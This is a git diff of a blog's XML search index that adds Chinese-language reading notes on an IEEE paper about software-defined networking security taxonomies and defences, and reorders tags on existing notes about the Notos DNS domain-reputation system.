- 通过检查防火墙流量空间和授权空间来解决SDN防火墙中的问题和冲突。此方法的功能是搜索整个网络中的流路径，并根据所有防火墙拒绝规则确定流路径以确定问题。 SDN安全的关键组件 Securing the control layer - 控制器被称为SDN的大脑或所有功能发生的中央决策点。作为一个中心点，控制器是黑客感兴趣的攻击目标。潜在的攻击者可以尝试控制网络，伪装成SDN控制器或者只是闯入控制器本身。为了保护SDN控制器，需要强大的访问控制，需要DDoS保护，防病毒和其他威胁防御和检测，缓解技术。 Securing traffic flow - SDN基于智能转发流量。它是SDN功能的主要部分，因此必须加以保护。 Layered Taxonomy of SDN Security SDN安全的开放研究领域 Operating system alteration- 操作系统是管理网络硬件和软件资源并为网络程序提供公共服务的软件。 如果操作系统发生变化，结果将足够危险。它可以感染所有层和接口，并可能影响应用程序管理功能。操作系统的更改可以通过可信计算进行保护，但是需要在此领域开展工作的研究。 Unauthorized Intrusion - 这是一种非法访问任何网络的行为。所有层和接口都是这些类型攻击的目标。它可能破坏网络的所有功能。所以，需要安全管理模块作为保护技术。 Several attacks - 对于SDN安全性，应该仔细确定几种类型的攻击。大多数攻击都是由研究人员解决的，但是还存在其他一些攻击仍未得到解决，如欺骗攻击。]]></content>
-      <categories>
-        <category>论文选读</category>
-      </categories>
-      <tags>
         <tag>SDN</tag>
-        <tag>安全</tag>
-        <tag>论文笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -156,6 +169,19 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[SDN安全论文选读（一）]]></title>
+    <url>%2F2018%2F12%2F23%2FSDN%E5%AE%89%E5%85%A8%E8%AE%BA%E6%96%87%E9%80%89%E8%AF%BB%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[Security of Software Defined Networks: Taxonomic Modeling, Key Components and Open research area来源Kaur R, Singh A, Singh S, et al. Security of software defined networks: Taxonomic modeling, key components and open research area[C]//Electrical, Electronics, and Optimization Techniques (ICEEOT), International Conference on. IEEE, 2016: 2832-2839. 为了做关于SDN安全的报告而读的一篇论文，可能看的并不仔细。 软件定义网络软件定义网络承诺网络运营商大大简化网络管理，其通过网络可编程性提供灵活性和创新。 借助SDN，网络管理从低级设备配置的编码功能转变为构建便于网络管理和调试的软件，为解决存在已久的问题提供了一种新的方法。 但是，SDN的发展也带来了新的挑战。 各种架构组件的引入和SDN新颖实体的上升循环带来了新的安全问题和威胁。 SDN被认为是数字威胁和网络攻击的主要目标，并且比简单网络具有更具破坏性的影响。 SDN的架构引发了新的外部和内部威胁和漏洞。 完整性和安全性没有被证明，更容易被通过单点攻击整个网络 可编程性为攻击者提供了执行恶意代码的能力 南向接口可能存在拒绝服务攻击和侧信道攻击 配置错误可能带来更大的危害。 SDN的代理可能被注入错误的流信息。 可能漏洞 认证攻击 数据泄露 恶意注入攻击 控制器劫持或欺骗规则注入 拒绝服务攻击 控制器-交换器通信洪泛 交换器流表洪泛 配置错误 安全解决方案分类 Secure Composition FRESCO [6] - 主要解决安全可编程问题，对于除了数据层其他层都有很大的影响，它旨在解决可加速设计新的SDN安全服务的各种关键问题。它还导出一个脚本API，使安全专家能够将安全监控和威胁检测逻辑编码为模块化库。 FORTNOX [2] - 新的安全策略实施内核。它处理授权和规则冲突，并对接口和控制层产生直接影响。 Security Audit VERIFICARE - 给出满足设计要求的模型。该提议作为验证网络正确性和规范建模的验证平台。 SDN DEBUGGER - SDN调试器帮助研究人员找出bug的根本原因。它捕获并重建导致错误行为的事件序列。调试器可帮助研究人员解决逻辑错误，并帮助网络运营商收集错误报告，然后将其提交给供应商。 Security enforcement policy VERIFLOW - Veriflow [6]基本上实时验证了网络范围内的不变量。 它是SDN控制器和网络设备之间的一个层，可以在插入修改和删除的每个转发规则时动态检查实时不变量违规。 FLOVER - Son.et al提出的Flover [6]基本上是一种检查模型，用于根据网络安全策略确定和验证流策略。它有助于设计复杂的威胁检测和缓解模块。 Perm OF - 一个细粒度的权限系统，包含各种特定于OF的权限。 Security Enhancement FleXam - FleXam是OpenFlow的采样扩展，允许Controller定义应该采样的数据包，应该选择每个数据包的哪些部分以及应该将它们发送到何处。FleXam使控制器能够动态调整采样率，从而降低控制平面负载。 CLOUDWATCHER - 一种监控云的新安全监控服务模型。CLOUDWATCHER [7]改变了网络流量的路由路径，它使流量通过安全设备所在的网络节点进行传输。 L-IDS - 学习入侵检测系统（IDS）。L-IDS是移动设备的安全服务，用于在特定区域或位置进行保护。 Security Analysis OpenWatch - 它是一个程序，可以将不同的异常检测应用程序作为输入，并决定应监视哪些流程 AVANT-GUARD - 包含两种技术，第一种技术是连接迁移，它显着减少了由于南向接口上的DOS攻击而产生的数据到控制平面的交互。另一种技术是通过在SDN设备中提供条件触发推送功能来解决响应性挑战的致动触发器。 HEADER SPACE ANALYSIS - 通过检查防火墙流量空间和授权空间来解决SDN防火墙中的问题和冲突。此方法的功能是搜索整个网络中的流路径，并根据所有防火墙拒绝规则确定流路径以确定问题。 SDN安全的关键组件 Securing the control layer - 控制器被称为SDN的大脑或所有功能发生的中央决策点。作为一个中心点，控制器是黑客感兴趣的攻击目标。潜在的攻击者可以尝试控制网络，伪装成SDN控制器或者只是闯入控制器本身。为了保护SDN控制器，需要强大的访问控制，需要DDoS保护，防病毒和其他威胁防御和检测，缓解技术。 Securing traffic flow - SDN基于智能转发流量。它是SDN功能的主要部分，因此必须加以保护。 Layered Taxonomy of SDN Security SDN安全的开放研究领域 Operating system alteration- 操作系统是管理网络硬件和软件资源并为网络程序提供公共服务的软件。 如果操作系统发生变化，结果将足够危险。它可以感染所有层和接口，并可能影响应用程序管理功能。操作系统的更改可以通过可信计算进行保护，但是需要在此领域开展工作的研究。 Unauthorized Intrusion - 这是一种非法访问任何网络的行为。所有层和接口都是这些类型攻击的目标。它可能破坏网络的所有功能。所以，需要安全管理模块作为保护技术。 Several attacks - 对于SDN安全性，应该仔细确定几种类型的攻击。大多数攻击都是由研究人员解决的，但是还存在其他一些攻击仍未得到解决，如欺骗攻击。]]></content>
+      <categories>
+        <category>论文选读</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+        <tag>论文笔记</tag>
+        <tag>SDN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[《Building a Dynamic Reputation System for DNS》笔记]]></title>
     <url>%2F2018%2F12%2F20%2FBuilding-a-Dynamic-Reputation-System-for-DNS%2F</url>
     <content type="text"><![CDATA[来源Antonakakis M, Perdisci R, Dagon D, et al. Building a Dynamic Reputation System for DNS[C]//USENIX security symposium. 2010: 273-290. 主要内容DNS对于合法的网络应用和网络攻击都是十分关键的协议。 黑名单对于应对恶意攻击是十分有效的，但是黑客可以通过变化域名来越过黑名单，所以如何及时准确的扩充黑名单是一个严峻的问题。本文研究的问题是如何动态的为一个新的未知的域名进行信誉评分。本文是基于对动态的恶意的DNS利用的独有特征的观察，可以从这些特征中分辨恶意与合法的行为。 文中设计了一个系统Notos。其利用从多方面收集的被动的DNS解析记录去建立对于合法的服务DNS资源是如何分配和利用的模型，利用已经获得的恶意域名及其行为来建立恶意域名的网络资源的利用的模型。 在之前的工作中，有研究者利用IP地址的信誉来过滤垃圾邮件或者恶意行为。 我们的系统是第一个综合的动态域名信誉系统。 被动DNS信息收集是Florian Weimer 首先提出的。 F. Weimer. Passive DNS replication. In Proceedings of FIRST Conference on Computer Security Incident, Hand ling, Singapore, 2005. B. Zdrnja 讨论了如何利用pDNS数据进行安全信息的收集。 B. Zdrnja, N. Brownlee, and D. Wessels. Passive monitoring of DNS anomalies. In Proceedings of DIMVA Conference, 2007. 研究者试图利用独有的特征去检测恶意行为的来源。 Anderson proposed Spamscatter as the first system to identify and characterize spamming infrastructure by utilizing layer 7 analysis 。 利用7层分析去确定垃圾邮件设施。 D. Anderson, C. Fleizach, S. Savage, and G. Voelker. Spamscatter: Characterizing internet scam hosting infrastructure. In Proceedings of the USENIX Security Symposium, 2007 Felegyhazi proposed a DNS reputation blacklisting methodology based on WHOIS observations. 基于WHOIS信息的DNS信誉黑名单方法 M. Felegyhazi, C. Keibich, and V. Paxson. On the potential of proactive domain blacklisting. In Third USENIX LEET Workshop, 2010. Sato proposed a way to extend current blacklists by observing the co-occurrence of IP address information. 通过观察IP地址的相关性来扩展现有的黑名单。 K. Sato, K. Ishibashi, T. Toyono, and N. Miyake. Extending black domain name list by using co-occurrence relation between dns queries. In Third USENIX LEET Workshop, 2010. 特征提取Notos 利用的信息包括网络IP地址的归属，自治系统和蜜罐分析，生存时间很短的被动的DNS信息。 从被动信息中提取的信息包括： Related Historic IPs (RHIPs) IP相关历史 Related Historic Domains (RHDNs) 域名相关历史 然后进行分类： Network-based features 共18个特征 BGP features 9个特征 AS features 3个特征 AS features 6个特征 Zone-based features 共17个特征 String features 12个特征 TLD features 5个特征 Evidence-based features 共6个特征 Honeypot features 3个特征 Blacklist features 3个特征 离线模块： Network Profiles Model Popular Domains Common Domains Akamai Domains CDN Domains Dynamic DNS Domains Domain Name Clusters Network-based Clustering Zone-based Clustering Reputation Function 数据收集两个方面： the historical or “passive” information from successful A-type DNS resolutions two ISP-based sensors the aggregated DNS traffic from the different networks covered by the SIE]]></content>
@@ -163,10 +189,10 @@
         <category>论文选读</category>
       </categories>
       <tags>
-        <tag>安全</tag>
-        <tag>论文笔记</tag>
         <tag>DNS</tag>
         <tag>恶意域名检测</tag>
+        <tag>安全</tag>
+        <tag>论文笔记</tag>
       </tags>
   </entry>
   <entry>
